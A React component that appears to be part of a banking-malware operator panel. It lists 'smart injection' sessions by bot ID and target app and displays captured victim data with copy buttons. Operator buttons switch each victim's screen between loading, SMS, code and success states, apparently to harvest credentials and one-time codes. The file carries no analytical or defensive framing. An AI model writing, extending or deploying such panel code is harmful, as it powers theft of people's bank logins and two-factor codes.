import React from "react";
import {SmartInjectionSession} from "../../../Model/SmartInjectionSession";
import {useTranslation} from "react-i18next";
import {Alert, Button, Col, Divider, Input, Pagination, Row, Space, Tag} from "antd";
import {CopyOutlined} from "@ant-design/icons";
import {AppState} from "../../../Store/RootReducer";
import {updateSmartInjectionSession} from "../../../Store/SmartInjections/Actions";
import Spinner from "../../Misc/Spinner";
import {getBackendUrl, successNotify} from "../../../Util/config";
import CopyToClipboard from "react-copy-to-clipboard";
import {useAppDispatch} from "../../../Hook/useAppDispatch";
import {useAppSelector} from "../../../Hook/useAppSelector";

interface InjectProps {
    inject: SmartInjectionSession[],
    paginationHandler: (pageNumber: number, size: number) => void,
    isLoaded: boolean,
}

const SmartInjectCardItem: React.FC<InjectProps> = (props: InjectProps) => {
    const {t} = useTranslation();
    const dispatch = useAppDispatch();

    const smartInjectionsReducer = useAppSelector((state: AppState) => state.smartInjections);

    return (
        <div className="panel-content">
            <Pagination
                onChange={props.paginationHandler}
                current={smartInjectionsReducer.page}
                total={smartInjectionsReducer.total}
                defaultPageSize={smartInjectionsReducer.per_page}
                showSizeChanger={true}
                locale={{
                    items_per_page: "",
                }}
                style={{marginBottom: 15}}
            />

            <Row gutter={15}>
                {props.inject.map((inject: SmartInjectionSession, key) => {
                    const injectData = inject.data;

                    return (
                        <Col xxl={6} xl={8} md={12} sm={24} xs={24} key={key} style={{marginBottom: 15}}>
                            <div className="inject-card">
                                <div>
                                    <Alert type="success" message={`${t("SMART_INJECT_ACTION")}: ${inject.action}`} />

                                    <div className="inject-head">
                                        <div>
                                            <Space>
                                                <span>[ID: #{inject.id}]</span>

                                                <div className="app-icon" style={{
                                                    backgroundImage: `url(${getBackendUrl(inject.application)})`,
                                                }} />

                                                <span className="text-ellipsis">{inject.application}</span>
                                            </Space>
                                        </div>
                                        <div>
                                            <Space size={0}>
                                                {!inject.is_closed && (
                                                    <Tag color="#5a9d32" style={{fontSize: "inherit", padding: "5px 15px"}}>
                                                        {t("INJECT_OPENED")}
                                                    </Tag>
                                                )}

                                                {/**
                                                <Button
                                                    icon={<DeleteFilled />}
                                                    type="primary"
                                                    danger
                                                    onClick={() => {
                                                        Modal.confirm({
                                                            title: t("CONFIRM_TITLE"),
                                                            content: t("UNDONE_ACTION"),
                                                            icon: <DeleteOutlined />,
                                                            onOk: deleteInject,
                                                            okButtonProps: {
                                                                danger: true,
                                                            },
                                                            cancelText: t("MODAL_BUTTON_CANCEL"),
                                                        });
                                                    }}
                                                />
                                                */}

                                            </Space>
                                        </div>
                                    </div>
                                    <div>
                                        <div>
                                            <a>{inject.bot_id}</a>
                                        </div>
                                    </div>
                                    <div className="inject-content">
                                        <div>
                                            <Divider orientation="center">{t("INFORMATION")}</Divider>
                                            <div>
                                                <b>{t("DATE")}:</b> {inject.created_at} <br />
                                                <b>{t("LAST_ACTIVITY")}:</b> 13 sec. ago <br />
                                                <b>{t("SMART_INJECT_STATE")}:</b> {inject.action}
                                            </div>
                                        </div>
                                        <div>
                                            <Divider orientation="center">{t("DATA")}</Divider>
                                            <div className="inject-data">
                                                {injectData ? (
                                                    Object.keys(injectData).map((item, key) => {
                                                        return (
                                                            <Input.Group key={key}>
                                                                <Input
                                                                    addonBefore={item}
                                                                    // @ts-ignore
                                                                    value={injectData[item]}
                                                                    readOnly={true}
                                                                    style={{
                                                                        width: "calc(100% - 33px)",
                                                                    }}
                                                                />
                                                                <CopyToClipboard
                                                                    text={
                                                                        // @ts-ignore
                                                                        injectData[item]
                                                                    }
                                                                    onCopy={() => {
                                                                        successNotify(t("SUCCESS"), t("COPIED"));
                                                                    }}
                                                                >
                                                                    <Button
                                                                        icon={<CopyOutlined />}
                                                                        type="primary"
                                                                    />
                                                                </CopyToClipboard>
                                                            </Input.Group>
                                                        );
                                                    })
                                                ) : (
                                                    <Spinner
                                                        title={t("WAITING_FOR_DATA")}
                                                    />
                                                )}
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div>
                                    <div className="inject-action">
                                        <Button
                                            type="primary"
                                            icon={(
                                                <span role="img" className="anticon">
                                                    <i className="fa-solid fa-home" style={{fontSize: 16}} />
                                                </span>
                                            )}
                                            onClick={() => dispatch(updateSmartInjectionSession(inject.id, "default"))}
                                            disabled={inject.action === "default"}
                                        >
                                            {t("ACTION_DEFAULT")}
                                        </Button>

                                        <Button
                                            type="primary"
                                            icon={(
                                                <span role="img" className="anticon">
                                                    <i className="fa-solid fa-refresh" style={{fontSize: 16}} />
                                                </span>
                                            )}
                                            onClick={() => dispatch(updateSmartInjectionSession(inject.id, "loading"))}
                                            disabled={inject.action === "default"}
                                        >
                                            {t("ACTION_LOADING")}
                                        </Button>

                                        <Button
                                            type="primary"
                                            icon={(
                                                <span role="img" className="anticon">
                                                    <i className="fa-solid fa-envelope" style={{fontSize: 16}} />
                                                </span>
                                            )}
                                            onClick={() => dispatch(updateSmartInjectionSession(inject.id, "sms"))}
                                            disabled={inject.action === "default"}
                                        >
                                            SMS
                                        </Button>

                                        <Button
                                            type="primary"
                                            icon={(
                                                <span role="img" className="anticon">
                                                    <i className="fa-solid fa-check" style={{fontSize: 16}} />
                                                </span>
                                            )}
                                            onClick={() => dispatch(updateSmartInjectionSession(inject.id, "success"))}
                                            disabled={inject.action === "default"}
                                        >
                                            {t("ACTION_SUCCESS")}
                                        </Button>

                                        <Button
                                            type="primary"
                                            icon={(
                                                <span role="img" className="anticon">
                                                    <i className="fa-solid fa-shield" style={{fontSize: 16}} />
                                                </span>
                                            )}
                                            onClick={() => dispatch(updateSmartInjectionSession(inject.id, "code"))}
                                            disabled={inject.action === "code"}
                                        >
                                            {t("ACTION_CODE")}
                                        </Button>
                                    </div>
                                </div>
                            </div>
                        </Col>
                    );
                })}
            </Row>

            <Pagination
                onChange={props.paginationHandler}
                current={smartInjectionsReducer.page}
                total={smartInjectionsReducer.total}
                defaultPageSize={smartInjectionsReducer.per_page}
                showSizeChanger={true}
                locale={{
                    items_per_page: "",
                }}
                style={{
                    marginTop: 15,
                }}
            />
        </div>
    );
};

export default SmartInjectCardItem;
